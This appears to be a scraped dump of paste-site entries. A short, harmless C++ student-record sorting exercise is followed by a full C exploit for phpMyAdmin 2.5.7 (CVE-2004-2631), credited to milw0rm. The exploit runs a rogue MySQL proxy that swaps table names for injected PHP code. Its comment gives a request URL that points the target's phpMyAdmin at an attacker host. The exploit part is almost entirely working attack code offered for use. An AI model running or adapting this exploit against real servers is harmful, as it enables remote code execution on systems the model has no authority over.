  maindata: '86e7e58c1c0e686c77405698d49b2df03a93f61e42a64edd1ba4109020bfc16ee6a8284e119eacb33f2cd8e7aa4503bf910d92804d59d29641de29afa23ebfe85faa706ccca2bf4f8783aa4561bdbdd331c642ce871d5114739cff9fe7a1f1b57ebae1f9676d174bda22d3949dd644fe2148b434d880c03b0bf6c7396953fc61',
  otherdata: [
    '769ed35a5d95fc0cca9a7e45bb818876',
    '2fe89f4acdf97d1c92794081b70034bf',
    'ae08183e1dde1b9ef090b672b952a460',
    '17f6f29f645806265906a6234e1f4dd2',
    '2610ea1ed916724bd63023e1498a1bc8',
    '98e46b89aaba277b570be7ab8ff324b5',
    '6ccb18b19085b84c5c14ca47e415edaa',
    '8ed267bd936b4eaea8ddaf74b7e2f4be'
  ]
}"
AsJkQq4a,Untitled,35657,C++,Friday 24th of May 2024 05:48:45 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>

template<typename container>
void print(container cont) {
    for (const auto& a : cont) {
        std::cout << a;
    }
    std::cout << std::endl;
}

struct student {
    std::string name;
    std::string surname;
    int course; // от 1 до 5
    int rating; // до 100
    double average_score; // до 5
};


std::ostream& operator<<(std::ostream& output, const student& st) {
    output << st.name << "" "" << st.surname << "" "" << st.course << "" "" << st.rating << "" "" << st.average_score << std::endl;
    return output;
}

int main() {

    setlocale(LC_ALL, ""ru"");

    std::vector<student> students{ {""Иван"", ""Иванов"", 1, 33, 3.7}, {""Владимир"", ""Михайлов"", 3, 39, 3.9}, {""Геннадий"", ""Петров"", 2, 56, 4.2}, {""Ольга"", ""Григорьева"", 5, 48, 4.0}, {""Елена"", ""Гришина"", 4, 75, 4.9} };

    print(students);
    
    std::sort(students.begin(), students.end(), [](const student& left, const student& right) { return left.surname < right.surname; });

    print(students);

    std::sort(students.begin(), students.end(), [](const student& left, const student& right) { return left.rating > right.rating; });

    print(students);

    std::sort(students.begin(), students.end(), [](const student& left, const student& right) { return left.average_score > right.average_score; });

    print(students);
}
"
668SZvTm,phpMyAdmin 2.5.7 - Remote code Injection - CVE-2004-2631,FlyFar,C,Friday 24th of May 2024 05:41:58 AM CDT,"/*    
 * phpmy-explt.c  
 * written by Nasir Simbolon <nasir kecapi com>
 * eagle kecapi com
 * Jakarta, Indonesia
 * 
 * June, 10 2004 
 * 
 * A phpMyAdmin-2.5.7 exploite program.
 * This is a kind of   mysql server wrapper  acts like a proxy except that it will sends a fake table name,
 * when client query ""SHOW TABLES"",  by replacing the real table name with a string contains exploite codes.
 *
 * Compile : gcc phpmy-explt.c -o phpmy-explt
 *
 * run with
 * ./phpmy-explt
 *
 * and go to your target and put 
 *
 * http://target/phpMyAdmin-2.5.7/left.php?server=4&cfg[Servers][4][host]=
 * attacker.host.com&cfg[Servers][4][port]=8889&cfg[Servers][4][auth_type]=config&cfg[Servers]
 * [4][user]=user&cfg[Servers][4][password]=pass&cfg[Servers][4][connect_type]=tcp&&cfg[Servers]
 * [4][only_db]=databasename
 *
 * fill host,port,user,pass and databasename correctly
 *
 */


#include<stdio.h>
#include<sys/socket.h>
#include<netdb.h>

#define BIND_PORT 8889
#define MYSQL_PORT 3306
#define HOSTNAME ""localhost""
#define DATABASE ""phpmy""


#define BUFFER_LEN 1024

/* This is php code we want to inject into phpMyAdmin 
   Do NOT use  single quote (') in the string, use double quote ("") instead
*/
char *phpcodes = ""exec(\""touch /tmp/your-phpmyadmin-is-vulnerable\"");"";


  /* This is examples codes I captured when mysql server
     reply to client's request of query ""SHOW TABLES"" query.
     It shows  database  name 'phpmy' and contain one tablename  'mytable'
     Our aim is to manipulate the data received from mysql server
     by replacing 'mytable' with our exploide codes.
     
     0x1 ,0x0 ,0x0 ,0x1 ,0x1 ,0x1b,0x0 ,0x0 ,0x2 ,0x0 ,
     0xf ,'T' ,'a' ,'b' ,'l' ,'e' ,'s' ,'_' ,'i' ,'n' ,
     '_' ,'p' ,'h' ,'p' ,'m' ,'y' ,0x3 ,0x40,0x0 ,0x0 ,
     0x1 ,-2  ,0x3 ,0x1 ,0x0 ,0x1f,0x1 ,0x0 ,0x0 ,0x3 ,
     -2  ,8  ,0x0 ,0x0 ,0x4 ,7   ,'m' ,'y' ,'t' ,'a' ,
     'b' ,'l' ,'e' ,0x1 ,0   ,0   ,0x5 ,-2
  */


int build_exploite_code(char* dbname,char* phpcodes,char** expcode)
{	
   char my1[21] = {0x1 ,0x0 ,0x0 ,0x1 ,0x1 ,0x1b,0x0 ,0x0 ,0x2 ,0x0 ,
     	 	   0xf ,'T' ,'a' ,'b' ,'l' ,'e' ,'s' ,'_' ,'i' ,'n' ,
     		   '_'}; 
   /* part of dbname     ('p' ,'h' ,'p' ,'m' ,'y') */
   char my2[15] = {0x3 ,0x40,0x0 ,0x0 ,0x1 ,-2  ,0x3 ,0x1 ,0x0 ,0x1f,
	           0x1 ,0x0 ,0x0 ,0x3 ,-2};  
   /* part of int phpcodes string length +1   (8) */ 
   char my3[3]  = {0x0 ,0x0 ,0x4};
   /* part of int phpcodes string length      (7) */ 
   /* part of tablename    ('m' ,'y' ,'t' ,'a' ,'b' ,'l' ,'e' ) */
   char my4[5]  = {0x1 ,0   ,0   ,0x5 ,-2};
	
   int len,i;

   len = 21 + strlen(dbname) + 15 + 1 + 3 + 1 +  strlen(phpcodes) + 5 + 5;
   *expcode = (char*) malloc(sizeof(char) * len); 
   
   i = 0;
   bcopy(&my1[0],*expcode + i,21);
   i += 21;
   bcopy(dbname, *expcode + i,strlen(dbname));
   i += strlen(dbname);
   bcopy(&my2[0],*expcode + i,15);
   i += 15;
   (*expcode)[i] = 5 + strlen(phpcodes) + 1;
   i ++;
   bcopy(&my3[0],*expcode + i,3);
   i += 3;  
   (*expcode)[i++] = 5 + strlen(phpcodes) ;
   /* this is our exploite codes*/
   (*expcode)[i++] = '\\'; 
   (*expcode)[i++] = '\''; 
   (*expcode)[i++] = ';'; 
   bcopy(phpcodes,*expcode + i,strlen(phpcodes));
   i += strlen(phpcodes);
   (*expcode)[i++] = '/'; 
   (*expcode)[i++] = '*'; 
   bcopy(&my4[0],*expcode + i,5);
   
   return len;
}

/* connect to mysql server*/

int connect_mysql()
{
    int s2;
    struct sockaddr_in ina;
    struct hostent *h;
    
    h = gethostbyname(HOSTNAME);
    /* set internet address */
    bcopy(h->h_addr,(void *)&ina.sin_addr,h->h_length);
    ina.sin_family = AF_INET;
    ina.sin_port = htons(MYSQL_PORT);
    //ina.sin_zero[0]='\0';
    if((s2=socket(AF_INET,SOCK_STREAM,0)) < 0) 
  	perror(""Socket: "");
    
    if(connect(s2,(struct sockaddr *)&ina,sizeof(ina)) < 0 )
	                   perror(""connect()"");
    return s2;
}

/* listener */
int listener()
{
    int s1;
    int opt;
    struct sockaddr_in ina;

    /* set internet address */
    ina.sin_family = AF_INET;
    ina.sin_port = htons(BIND_PORT);
    ina.sin_addr.s_addr = INADDR_ANY;

    if((s1=socket(AF_INET,SOCK_STREAM,0)) < 0) 
  	perror(""Socket: "");
    
    opt = 1;
    setsockopt(s1,SOL_SOCKET, SO_REUSEADDR , (char *)&opt, sizeof(opt) );
       
    if(bind(s1,(struct sockaddr *)&ina,sizeof(ina))==-1) 
	perror(""Bind: "");
	
    if(listen(s1, 10) == -1) 
  	perror(""Listen""); 
	
   return s1;
}


int main(int argc,char* argv[])
{
	struct sockaddr_in ina1;
	int ina1_l;
	int s_daemon,s_mysql;
	size_t byte_read,byte_written;
	char *buf;
	int sc,event,n_select;
	fd_set rfds;
        struct timeval tv;	 
	int exptlen,i;
	char *expt;
	char *dbname=DATABASE;
	
	buf = (char*) malloc(sizeof(char) * (BUFFER_LEN));
	tv.tv_sec  = 15;
	tv.tv_usec = 0;
	
	/* we listen to port */
	 s_daemon = listener();
    
	exptlen = build_exploite_code(dbname,phpcodes,&expt);

	for(;;) 
	{
	   fprintf(stderr,""waiting for connection\n"");
	   
	   if( -1 == (sc = accept(s_daemon,(struct sockaddr *) &ina1,&ina1_l)) ) 
		  perror(""accept()"");
	   /* if we get here, we have a new connection */
	   fprintf(stderr,""got client connection\n"");
mysql:
	   /* connect to mysql */
	   s_mysql = connect_mysql();
        
	   for(;;) 
	    {
	   	FD_ZERO(&rfds);
	        FD_SET(sc,&rfds);
  	   	FD_SET(s_mysql,&rfds);                                
		
	        n_select = (sc > s_mysql)? sc : s_mysql;

	    	event = select(n_select+1,&rfds,NULL,NULL,NULL);
	    	if(-1  == event) 
		    perror(""select()"");
	        else 
		{	
		    if(FD_ISSET(s_mysql,&rfds)) 
		     {
			byte_read = read(s_mysql,buf,BUFFER_LEN);
		    	/* check for closing client connection*/
		    	if(byte_read == 0) 
	  	        {
			   shutdown(s_mysql,SHUT_RDWR);
			   close(s_mysql);
			   goto mysql;
		        }

			 /* check data received from mysql server.
			  * if  buf[11] contain 'T', data received from   mysq server is table list
			  *
			  * NOW we replace the table with our exploite codes and send them to client
			  */
		        if( 'T' == buf[11])
			{
		           for(i=0;i<exptlen;i++) 
		              buf[i] = expt[i];
		           byte_read = exptlen;
		        }
		       
		        if(write(sc, buf, byte_read) < 0)
		           break; 
		     }
	           
	             if(FD_ISSET(sc,&rfds)) 
		     {	
	   	         byte_read = read(sc,buf,BUFFER_LEN);
		         /* check for closing client connection*/
		         if(byte_read == 0) 
		         {	
			    close(sc);    
			    break;
		         }

		       if(write(s_mysql,buf,byte_read) < 0) 
			       break; 	    
		     }    
#if defined(DEBUG)		     
		     fprintf(stderr,""data:\n"");	
		     for(i=0;i<byte_read;i++) 
			     fprintf(stderr,"" %c(%x) "",buf[i],buf[i]);
#endif    
	        }   

	    } 
	}
	free(buf);
	free(expt);
	return 0;
}

// milw0rm.com [2004-07-04]
            "
